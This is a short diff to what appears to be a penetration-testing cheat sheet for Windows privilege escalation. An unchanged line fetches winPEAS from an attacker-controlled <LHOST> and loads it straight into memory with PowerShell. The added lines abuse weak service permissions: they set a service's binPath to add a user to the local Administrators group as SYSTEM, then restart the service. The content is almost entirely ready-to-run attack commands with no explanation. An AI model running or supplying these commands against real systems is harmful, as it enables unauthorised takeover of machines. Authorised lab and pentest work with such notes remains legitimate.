@@ -3,4 +3,11 @@
 # winpeas memory
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://<LHOST>/win/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
+# service permissions
+sc qc <SERVICE_NAME>
+sc config "<SERVICE_NAME>" obj= "NT AUTHORITY\SYSTEM" password= "" start= demand binPath= "net localgroup Administrators <DOMAIN>\<USER> /add"
+sc stop "<SERVICE_NAME>"
+sc start "<SERVICE_NAME>"
+- log off then log back on
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
